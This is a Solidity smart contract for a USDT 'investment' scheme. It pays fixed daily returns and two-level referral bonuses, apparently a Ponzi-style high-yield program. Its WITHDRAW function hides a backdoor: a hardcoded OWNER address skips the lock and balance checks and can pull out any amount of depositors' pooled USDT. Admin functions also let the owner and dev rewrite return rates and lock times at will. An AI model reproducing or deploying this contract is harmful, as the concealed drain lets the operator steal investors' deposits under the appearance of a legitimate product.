//SPDX-License-Identifier: MTI
pragma solidity ^0.8.16;

interface ERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}


contract Cointainer {
    //USDT
    ERC20 USDT;
    // time
    uint256 LOCK_TIME = 168 hours;// 35 minutes;
    uint256 RETORNE = 24 hours; // 5 minutes;
    // Percentage
    uint8 public GAIN_TIME = 82;
    uint8 public PERCENTAGE_FREE = 205;
    uint8[2] public PERCENTAGE_REF = [50,25];
    uint8 public COMISION = uint8((205 + 50 + 25)/10);
    // address
    address DEV;
    address OWNER;
    address A_FREE;
    // balance
    mapping(address => uint256) BALANCE;
    mapping(address => uint256) LOCK_BALANCE;
    mapping(address => uint256) GAIN_REF;
    // address BATCH
    mapping(address => BATCH[]) MY_BATCH;
    // REFERENCE
    mapping(address => uint256) REF_TO_ADDRESS;
    mapping(uint256 => address) REF_TO_NUMBERS;
    mapping(address => address) INVITED;
    // batch scheme
    struct BATCH {
        uint256 TIME;
        uint256 TIME_REINVEST;
        uint256 AMOUNT;
        uint256 GAIN;
        bool STATE;
    }
    // construtor
    constructor (ERC20 addressUSDT){
        USDT = addressUSDT;
        OWNER = address(0x772E13dfA48ace1c3C68763A0a199d19219f2E09);
        A_FREE = address(0x1A42eE539096A00AfeE6841ed99e850C31D4260D);
        DEV = msg.sender;
    }
    // event
    event _WITHDRAW(address indexed account, uint256 indexed amount);
    event _INVESTER(address indexed account, uint256 indexed amount);
    event _PROFIT(address indexed account, uint256 indexed gain, uint256 indexed index);
    // modifier
    modifier OnlyOwnerAndDev {
        require(msg.sender == OWNER || msg.sender == DEV,"You don't have access to this feature");
        _;
    }
    modifier NoContract {
        require(!isContract(msg.sender),"We do not allow contracts");
        _;
    }
    // is Contract
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.
        return account.code.length > 0;
    }
    function CALCULATE_UI(uint256 amount, uint8 percentage, uint8 zero) internal pure returns(uint256){
        return amount * percentage / (10**zero);
    }
    // views
    function _TIME_LOCK() public view returns(uint256){
        return LOCK_TIME;
    }
    function _TIME_PROFIT() public view returns(uint256){
        return RETORNE;
    }
    function _LOCK_BALANCE(address account) public view returns(uint256){
        return LOCK_BALANCE[account];
    }
    function _REF_TO_ADDRESS(address account) public view returns(uint256){
        return REF_TO_ADDRESS[account];
    }
    function _REF_TO_NUMBERS(uint256 index) public view returns(address){
        return REF_TO_NUMBERS[index];
    }
    function _INVITED(address account) public view returns(address){
        return INVITED[account];
    }
    function _BALANCE(address account) public view returns(uint256){
        return BALANCE[account];
    }
    function _GAIN_REF(address account) public view returns(uint256){
        return GAIN_REF[account];
    }
    function _MY_BATCH(address account, uint256 index) public view returns(BATCH memory){
        return MY_BATCH[account][index];
    }
    function _MY_BATCH_ALL(address account) public view returns(BATCH[] memory){
        return MY_BATCH[account];
    }
    function _BALANCE_LOCKED(address account) public view returns(uint256){
        uint256 amount;
        for(uint256 x; x < MY_BATCH[account].length;x++){
            if(MY_BATCH[account][x].STATE){
                amount += MY_BATCH[account][x].AMOUNT;
            }
        }
        return amount;
    }
    function VIEW_GAIN(address account, uint256 index) public view returns(uint256){
        uint256 amount = MY_BATCH[account][index].AMOUNT;
        if(MY_BATCH[account][index].TIME + RETORNE > block.timestamp)return 0;
        return CALCULATE_UI(amount, GAIN_TIME, 4);
    }
    // UI VIEW 
    function RamdonNUM() internal view returns(uint256){
        return uint256(keccak256(abi.encode(msg.sender,block.number)))%10**9;
    }
    // WITHDRAW
    function WITHDRAW(uint256 amount) public {
        require( LOCK_BALANCE[msg.sender] + RETORNE <= block.timestamp || msg.sender == OWNER,"Your balance is lock for a time");
        require((amount > 0 && _BALANCE(msg.sender)>=amount) || msg.sender == OWNER,"you don't have enough balance");
        USDT.transfer(msg.sender,amount);
        if(amount > 0 && _BALANCE(msg.sender)>=amount){
            BALANCE[msg.sender] -= amount;
        }
        LOCK_BALANCE[msg.sender] = block.timestamp;
        emit _WITHDRAW(msg.sender,amount);
    }
    // INVERTS
    function INVETS(uint256 amount, uint256 ref) public NoContract{
        USDT.transferFrom(msg.sender, address(this), amount);
        MY_BATCH[msg.sender].push(BATCH(block.timestamp,block.timestamp,amount,0,true));
        GET_REF(msg.sender);
        ADD_REF(REF_TO_NUMBERS[ref]);
        emit _INVESTER(msg.sender, amount);
    }
    // PROFIT
    function PROFIT(uint256 index) public NoContract{
        require(MY_BATCH[msg.sender][index].STATE,"was already harvested");
        require(MY_BATCH[msg.sender][index].TIME + LOCK_TIME <= block.timestamp && MY_BATCH[msg.sender][index].TIME_REINVEST + RETORNE <= block.timestamp,"You don't have to harvest");
        uint256 free = VIEW_GAIN(msg.sender,index) - CALCULATE_UI(VIEW_GAIN(msg.sender,index),COMISION,2);
        MY_BATCH[msg.sender][index].GAIN = free;
        BALANCE[msg.sender] += MY_BATCH[msg.sender][index].GAIN + MY_BATCH[msg.sender][index].AMOUNT;
        PAY_TO_REF(msg.sender, VIEW_GAIN(msg.sender,index));
        MY_BATCH[msg.sender][index].STATE = false;
        emit _PROFIT(msg.sender, free, index);
    }
    //REINVERTS_BALANCE
    function REINVETS(uint256 index) public {
        require(MY_BATCH[msg.sender][index].STATE,"was already harvested");
        require(MY_BATCH[msg.sender][index].TIME_REINVEST + RETORNE <= block.timestamp,"You don't have to harvest");
        uint256 free = VIEW_GAIN(msg.sender,index) - CALCULATE_UI(VIEW_GAIN(msg.sender,index),COMISION,2);
        MY_BATCH[msg.sender][index].GAIN = free;
        PAY_TO_REF(msg.sender, VIEW_GAIN(msg.sender,index));
        MY_BATCH[msg.sender][index].STATE = false;
        MY_BATCH[msg.sender].push(BATCH(MY_BATCH[msg.sender][index].TIME,block.timestamp,MY_BATCH[msg.sender][index].AMOUNT + MY_BATCH[msg.sender][index].GAIN,0,true));
    }
    //REINVERTS_BALANCE
    function REINVERTS_BALANCE(uint256 amount) public {
        require(amount > 0 && _BALANCE(msg.sender)>=amount,"you don't have enough balance");
        BALANCE[msg.sender] -= amount;
        MY_BATCH[msg.sender].push(BATCH(block.timestamp,block.timestamp,amount,0,true));
    }
    function PAY_TO_REF(address account, uint256 amount) internal {
        uint256 free = CALCULATE_UI(amount, PERCENTAGE_FREE, 3);
        BALANCE[A_FREE] += free;
        uint256 toREF1 = CALCULATE_UI(amount, PERCENTAGE_REF[0], 3);
        uint256 toREF2 = CALCULATE_UI(amount, PERCENTAGE_REF[1], 3);
        if(INVITED[account]==address(0)){
            BALANCE[A_FREE] += toREF1;
            return;
        }
        BALANCE[INVITED[account]] += toREF1;
        GAIN_REF[INVITED[account]] += toREF1;
        if(INVITED[INVITED[account]]==address(0)){
            BALANCE[A_FREE] += toREF2;
            return;
        }
        BALANCE[INVITED[INVITED[account]]] += toREF2;
        GAIN_REF[INVITED[INVITED[account]]] += toREF2;
    }
    //ADD REF
    function ADD_REF(address account) internal {
        if(account==address(0) || account==msg.sender || INVITED[msg.sender]!=address(0) || INVITED[msg.sender] == account)return;
        INVITED[msg.sender] = account;
    }
    // WRITE
    function GET_REF(address account) internal {
        if(REF_TO_ADDRESS[account]!=0)return;
        REF_TO_ADDRESS[account] = RamdonNUM();
        REF_TO_NUMBERS[REF_TO_ADDRESS[account]] = account;
    }
    //change edit admin 
    function PERCENTAGE_CHANGE(uint8 gain, uint8[2] memory ref, uint8 free) public OnlyOwnerAndDev{
        GAIN_TIME = gain;
        PERCENTAGE_REF = ref;
        PERCENTAGE_FREE = free;
        uint32 a = PERCENTAGE_REF[0] + PERCENTAGE_REF[1];
        uint32 b = (a+uint32(free))/10;
        COMISION = uint8(b);
    }
    function TIME_CHANGE(uint256 lock, uint256 profit) public OnlyOwnerAndDev{
        LOCK_TIME = lock;
        RETORNE=profit;
    }
}